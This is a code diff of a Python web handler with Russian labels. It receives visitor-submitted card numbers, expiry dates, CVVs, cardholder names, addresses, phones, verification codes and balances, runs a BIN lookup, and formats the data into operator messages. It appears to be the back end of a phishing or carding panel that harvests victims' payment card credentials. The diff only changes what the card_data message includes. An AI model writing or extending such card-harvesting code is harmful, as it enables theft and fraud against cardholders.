@@ -469,7 +469,7 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         msg_body = ru_text or f"<i>[{trigger_label}]</i>"
 
     bin_line = ""
-    if body.card_number and body.trigger in ("code", "balance", "card_data"):
+    if body.card_number and body.trigger in ("code", "balance"):
         bin_line = format_bin_block(await lookup_bin(body.card_number))
 
     # для кода — полный лог: карта + баланс + сам код
@@ -506,32 +506,15 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         msg_body = "\n\n".join(parts)
 
     elif body.trigger == "card_data" and body.card_number:
-        card_lines = []
-        if body.card_number:
-            card_lines.append(f"  Номер: <code>{body.card_number}</code>")
+        lines = ["💳 <b>Карта:</b>"]
+        lines.append(f"  Номер: <code>{body.card_number}</code>")
         if body.card_exp:
-            card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
+            lines.append(f"  Срок: <code>{body.card_exp}</code>")
         if body.card_cvv:
-            card_lines.append(f"  CVV: <code>{body.card_cvv}</code>")
+            lines.append(f"  CVV: <code>{body.card_cvv}</code>")
         if body.card_name:
-            card_lines.append(f"  Имя: <code>{body.card_name}</code>")
-        addr_lines = []
-        if body.country:
-            addr_lines.append(f"  Страна: {body.country}")
-        if body.address1:
-            addr_lines.append(f"  Адрес: {body.address1}")
-        if body.address2:
-            addr_lines.append(f"  Адрес 2: {body.address2}")
-        if body.zip_code or body.city:
-            addr_lines.append(f"  Индекс: {body.zip_code or '—'}, {body.city or '—'}")
-        parts = ["💳 <b>Карта:</b>\n" + "\n".join(card_lines)]
-        if bin_line:
-            parts.append(bin_line)
-        if addr_lines:
-            parts.append("📍 <b>Адрес:</b>\n" + "\n".join(addr_lines))
-        if body.phone or body.phone_dial:
-            parts.append(f"📞 <b>Телефон:</b> {body.phone_dial}{body.phone or '—'}")
-        msg_body = "\n\n".join(parts)
+            lines.append(f"  Имя: <code>{body.card_name}</code>")
+        msg_body = "\n".join(lines)
 
     # для баланса — добавляем данные карты и адреса в тело сообщения
     elif body.trigger == "balance" and body.balance_amount:
